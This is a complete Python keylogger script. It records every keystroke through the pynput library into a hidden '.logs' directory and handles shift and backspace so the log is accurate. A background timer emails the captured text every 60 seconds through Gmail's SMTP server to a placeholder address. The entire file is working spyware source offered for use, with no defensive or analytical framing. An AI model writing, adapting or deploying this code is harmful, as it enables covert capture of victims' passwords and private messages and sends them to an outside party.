from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import threading
import os
import sys

LOG_DIR = ".logs"
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")
EMAIL_INTERVAL = 60  # Send email every 60 seconds
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB

# Create hidden directory if it doesn't exist
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def check_log_file_size():
    """Check if the log file is too big. Rename if it is."""
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > MAX_FILE_SIZE:
        os.rename(LOG_FILE, LOG_FILE.replace(".txt", "_old.txt"))
        open(LOG_FILE, "w").close()

def append_to_log(key_str):
    """Append keystrokes to the log file."""
    check_log_file_size()
    with open(LOG_FILE, "a") as log_file:
        log_file.write(key_str)

def truncate_last_char():
    """Remove the last character from the log file."""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r+") as log_file:
            content = log_file.read()
            log_file.seek(0)
            log_file.write(content[:-1])
            log_file.truncate()

def send_email():
    """Send the log file via email."""
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        print("No logs to send.")
        return

    sender = "your_email@gmail.com"
    recipient = "recipient_email@gmail.com"
    subject = "Keylogger Logs"
    with open(LOG_FILE, "r") as file:
        body = file.read()

    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = sender
    msg["To"] = recipient

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender, "your_password")
            server.send_message(msg)
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

    open(LOG_FILE, "w").close()  # Clear the log file after sending

def schedule_email():
    """Schedule periodic email sending."""
    send_email()
    threading.Timer(EMAIL_INTERVAL, schedule_email).start()

def k_press(key):
    """Handle key presses."""
    global is_shift_pressed
    try:
        key_str = key.char
        if is_shift_pressed and key_str:
            key_str = key_str.upper()
        append_to_log(key_str or f"[{key}]")
    except AttributeError:
        if key == Key.space:
            append_to_log(" ")
        elif key == Key.enter:
            append_to_log("\n")
        elif key == Key.backspace:
            truncate_last_char()
        elif key in (Key.shift, Key.shift_r):
            is_shift_pressed = True

def k_release(key):
    """Handle key releases."""
    global is_shift_pressed
    if key in (Key.shift, Key.shift_r):
        is_shift_pressed = False

if __name__ == "__main__":
    threading.Thread(target=schedule_email, daemon=True).start()
    is_shift_pressed = False
    with Listener(on_press=k_press, on_release=k_release) as listener:
        listener.join()
